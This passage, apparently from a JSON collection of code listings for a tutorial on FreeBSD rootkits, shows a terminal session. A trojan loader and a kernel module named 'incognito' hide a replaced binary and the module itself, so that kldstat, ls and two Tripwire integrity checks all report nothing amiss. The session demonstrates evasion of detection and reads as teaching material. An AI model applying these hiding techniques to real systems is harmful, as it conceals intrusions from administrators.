exit(0);\n}\n\n```", "```\n$ `sudo tripwire --check`\nParsing policy file: /usr/local/etc/tripwire/tw.pol\n*** Processing Unix File System ***\nPerforming integrity check...\nWrote report file: /var/db/tripwire/report/slavetwo-20070305-072935.twr\n\nTripwire(R) 2.3.0 Integrity Check Report\n\nReport generated by:          root\nReport created on:            Mon Mar 5 07:29:35 2007\nDatabase last updated on:     Mon Mar 5 07:28:11 2007\n. . .\n\nTotal objects scanned:  69628\nTotal violations found:  0\n\n=============================================================================\nObject Summary:\n=============================================================================\n\n-----------------------------------------------------------------------------\n# Section: Unix File System\n-----------------------------------------------------------------------------\n\nNo violations.\n\n=============================================================================\nError Report:\n=============================================================================\n\nNo Errors\n-----------------------------------------------------------------------------\n*** End of report ***\n\nTripwire 2.3 Portions copyright 2000 Tripwire, Inc. Tripwire is a registered\ntrademark of Tripwire, Inc. This software comes with ABSOLUTELY NO WARRANTY;\nfor details use --version. This is free software which may be redistributed\nor modified only under certain conditions; see COPYING for details.\nAll rights reserved.\nIntegrity check complete.\n$ `hello`\nMay the force be with you.\n$ `sudo ./trojan_loader`\nY'all just mad. Because today, you suckers got served.\n$ `sudo kldload ./incognito-0.3.ko`\n$ `kldstat`\nId Refs Address    Size     Name\n 1    3 0xc0400000 63070c   kernel\n 2   16 0xc0a31000 568dc    acpi.ko\n$ `ls /sbin/t*`\n/sbin/tunefs\n$ `hello`\nMay the schwartz be with you!\n$ `sudo tripwire --check`\nParsing policy file: /usr/local/etc/tripwire/tw.pol\n*** Processing Unix File System ***\nPerforming integrity check...\nWrote report file: /var/db/tripwire/report/slavetwo-20070305-074918.twr\n\nTripwire(R) 2.3.0 Integrity Check Report\n\nReport generated by:          root\nReport created on:            Mon Mar 5 07:49:18 2007\nDatabase last updated on:     Mon Mar 5 07:28:11 2007\n. . .\n\nTotal objects scanned:  69628\nTotal violations found:  0\n\n=============================================================================\nObject Summary:\n=============================================================================\n\n-----------------------------------------------------------------------------\n# Section: Unix File System\n-----------------------------------------------------------------------------\n\nNo violations.\n\n=============================================================================\nError Report:\n=============================================================================\n\nNo Errors\n\n-----------------------------------------------------------------------------\n*** End of report ***\n\nTripwire 2.3 Portions copyright 2000 Tripwire, Inc. Tripwire is a registered\ntrademark of Tripwire, Inc. This software comes with ABSOLUTELY NO WARRANTY;\nfor details use --version. This is free software which may be redistributed\nor modified only under certain conditions; see COPYING for details.\nAll rights reserved.\nIntegrity check complete.\n\n```"]